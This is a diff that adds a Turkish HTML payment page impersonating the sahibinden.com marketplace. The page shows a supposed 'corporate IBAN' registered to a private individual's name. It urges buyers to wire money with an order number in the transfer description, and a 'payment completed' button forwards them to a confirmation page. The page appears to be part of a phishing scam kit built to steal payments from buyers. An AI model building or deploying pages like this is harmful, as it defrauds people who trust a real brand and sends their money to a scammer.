@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Güvenli Ödeme | sahibinden.com</title>
+  <link rel="stylesheet" href="iban.css">
+  <script>
+    // Ödeme tamamlandıktan sonra kontrol.html sayfasına yönlendirecek fonksiyon
+    function redirectToConfirmation() {
+      window.location.href = "kontrol.html"; // Burada kontrol.html sayfasına yönlendiriyoruz
+    }
+  </script>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <span class="logo">sahibinden.com</span>
+      <span class="guvenli">🔒 Güvenli ödeme</span>
+    </header>
+
+    <div class="main-content">
+      <!-- İBAN Bilgileri -->
+      <div class="card iban-card">
+        <h2>Sahibinden Kurumsal IBAN Bilgileri</h2>
+        <div class="form-group">
+          <p class="iban-text"><strong>Alıcı İsmi:</strong> Hoşyar Çelikçi</p>
+        </div>
+        <div class="form-group">
+          <p class="iban-text"><strong>IBAN Bilgisi:</strong> TR57 0006 2000 6760 0006 8696 38</p>
+        </div>
+        <div class="form-group">
+          <p class="iban-text"><strong>Sipariş Numarası:</strong> 8591414272</p>
+        </div>
+      </div>
+
+      <!-- Ödeme Kutucuğu -->
+      <div class="card order-card">
+        <h2>Ödeme Bilgileri</h2>
+        <div class="form-group">
+          <p class="iban-text"><strong>Sipariş Numaranızı AÇIKLAMA Kısmına Girmeniz Zorunludur. Açıklama Kısmına Yalnızca Sipariş Numarasını Giriniz!</strong> </p>
+        </div>
+        <div class="form-group">
+          <p class="iban-text"><strong>Sipariş Numarası Yazılmadan Gerçekleşen Ödemeler Onaylanmaz!</strong> </p>
+        </div>
+        <div class="form-group">
+          <p class="iban-text"><strong>Ödemeyi Gerçekleştirdikten Sonra Ödemeyi Tamamladım Butonuna Tıklayınız!</strong> </p>
+        </div>
+        <button class="pay-button" onclick="redirectToConfirmation()">Ödemeyi Tamamladım</button>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
